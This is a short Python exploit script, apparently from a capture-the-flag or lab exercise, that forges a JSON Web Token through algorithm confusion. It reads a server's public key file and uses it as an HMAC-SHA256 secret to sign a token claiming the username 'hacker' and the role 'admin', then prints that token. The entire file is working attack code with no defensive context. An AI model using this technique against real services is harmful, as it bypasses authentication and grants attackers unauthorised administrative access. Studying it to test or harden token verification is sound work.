import hmac
import hashlib
import base64
import json

def b64url(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

# Load public key
pub = open('public.pem', 'rb').read()

# Forge admin token
header  = b64url(json.dumps({"alg":"HS256","typ":"JWT"}, separators=(',',':')))
payload = b64url(json.dumps({"username":"hacker","role":"admin"}, separators=(',',':')))
msg     = f"{header}.{payload}"

sig = hmac.new(pub, msg.encode(), hashlib.sha256).digest()
token = f"{msg}.{b64url(sig)}"
print(token)
